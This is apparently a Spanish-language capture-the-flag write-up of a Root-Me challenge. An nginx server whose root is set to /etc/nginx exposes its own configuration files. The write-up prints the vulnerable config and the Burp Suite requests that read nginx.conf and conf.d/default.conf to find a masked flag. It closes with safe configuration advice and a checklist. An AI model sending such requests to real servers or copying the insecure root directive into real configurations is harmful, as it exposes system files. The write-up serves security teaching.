📝 Writeup: Nginx - Root Location Misconfiguration
🎯 CTF Challenge - Root-Me.org
📋 Índice

    Descripción del Reto

    Análisis Inicial

    Identificación de la Vulnerabilidad

    Explotación

    Obtención de la Flag

    Lecciones Aprendidas

    Referencias

1. Descripción del Reto {#descripción}

    Nombre: Nginx - Root Location Misconfiguration
    Puntos: 15
    Dificultad: Fácil
    Categoría: Web Server / Configuration
    Autor: .Yo0x
    Fecha: 27 septiembre 2024

📜 Enunciado

    "Nuestro desarrollador web nos dice que la intranet que ha desarrollado es segura porque contiene muy pocas funcionalidades. Demuéstrale que se equivoca leyendo la configuración del servidor."

🎯 Objetivo

Leer la configuración del servidor Nginx para encontrar la flag oculta.
2. Análisis Inicial {#análisis}
🔍 Configuración del Servidor

El reto nos proporciona la siguiente configuración de Nginx:
nginx

server {
    listen       80;
    server_name  _;
    root /etc/nginx;  # ⚠️ Punto crítico

    location = / {
        return 302 /login/login.html;
    }

    location /login/ {
        alias /usr/share/nginx/html/login/;
    }

    location /static/ {
        alias /var/www/app/static/;
    }

    location / {
        try_files $uri $uri/ =404;
        default_type text/plain;
    }
    
    error_page 404 =200 /error.txt;

    location /error.txt {
        internal;
    }
}

🚨 Hallazgo Crítico

La línea root /etc/nginx; es la vulnerabilidad principal. Esto significa que cualquier archivo dentro de /etc/nginx/ es accesible públicamente a través del servidor web.
3. Identificación de la Vulnerabilidad {#vulnerabilidad}
🔬 Análisis Técnico
Componente	Configuración	Riesgo
root	/etc/nginx	🔴 CRÍTICO - Expone archivos del sistema
location /	try_files	🟡 Busca archivos en el directorio raíz
error_page	404 =200	🟢 No afecta directamente
location /login/	alias	🟢 Seguro - Directorio aislado
🧠 Vector de Ataque

Al tener root /etc/nginx;, podemos acceder a cualquier archivo de configuración mediante peticiones HTTP:
text

GET /[archivo] → /etc/nginx/[archivo]

4. Explotación {#explotación}
🛠️ Herramientas Utilizadas

    Burp Suite Professional/Community - Para interceptar y modificar peticiones

    Navegador Web - Para verificación visual

📸 Paso 1: Configuración de Burp Suite

Primero, configuramos Burp Suite para interceptar el tráfico:
text

Target: challenge01.root-me.org:59093
Proxy: 127.0.0.1:8080

📸 Paso 2: Petición Inicial

Enviamos la petición al Repeater de Burp:
http

GET /login/login.html HTTP/1.1
Host: challenge01.root-me.org:59093
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

📸 Paso 3: Primer Intento - nginx.conf

Modificamos la petición para leer el archivo principal de configuración:
http

GET /nginx.conf HTTP/1.1
Host: challenge01.root-me.org:59093

Respuesta obtenida:
text

HTTP/1.1 200 OK
Server: nginx/1.27.2
Date: Mon, 20 Jul 2026 11:16:10 GMT
Content-Type: text/plain
Content-Length: 654
...

user  nginx;
worker_processes  auto;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    ...
    include /etc/nginx/conf.d/***********;
}

✅ Confirmación: ¡La vulnerabilidad funciona! Podemos leer archivos del sistema.
📸 Paso 4: Archivo Incluido - default.conf

El archivo nginx.conf incluye /etc/nginx/conf.d/*********. Intentamos leerlo:
http

GET /conf.d/********** HTTP/1.1
Host: challenge01.root-me.org:59093

Respuesta obtenida:
text

HTTP/1.1 200 OK
Server: nginx/1.27.2
Date: Mon, 20 Jul 2026 11:17:25 GMT
Content-Type: text/plain
Content-Length: 527
...

server {
    listen       59093;
    server_name  _;
    root /etc/nginx;

    location = / {
        return 302 /login/login.html;
    }

    location /login/ {
        alias /usr/share/nginx/html/login/;
    }

    location /static/ {
        alias /var/www/app/static/;
    }

    location / {
        try_files $uri $uri/ =404;
        default_type text/plain;
    }
    
    error_page 404 =200 /error.txt;

    location /error.txt {
        internal;
    }
}

#Congratulation the flag is ****************************

5. Obtención de la Flag {#flag}
🏁 Flag Encontrada
text

*****************************

🗺️ Mapa del Ataque
text

1. GET /nginx.conf
   ↓
2. Descubrimos: include /etc/nginx/conf.d/default.conf
   ↓
3. GET /conf.d/default.conf
   ↓
4. ¡Flag encontrada!

6. Lecciones Aprendidas {#lecciones}
❌ Configuraciones PELIGROSAS
nginx

# 🔴 MAL - EXPONE EL SISTEMA
root /etc/nginx;
root /var/;
root /usr/;

# 🔴 MAL - EXPONE ARCHIVOS OCULTOS
location / {
    try_files $uri $uri/ =404;
}

✅ Configuraciones SEGURAS
nginx

# 🟢 BIEN - SOLO EXPONE LA APP
root /var/www/html;

# 🟢 BIEN - BLOQUEA ARCHIVOS OCULTOS
location ~ /\. {
    deny all;
}

# 🟢 BIEN - RESTRICCIÓN POR EXTENSIÓN
location ~* \.(conf|ini|yaml|yml|json)$ {
    deny all;
    return 403;
}

🛡️ Checklist de Seguridad

    Nunca usar root con directorios del sistema

    Bloquear archivos ocultos (.htaccess, .git, .env)

    Restringir acceso a archivos de configuración

    Usar alias solo para directorios específicos

    Implementar autenticación para áreas sensibles

    Mantener logs de acceso para auditoría

    Actualizar Nginx regularmente
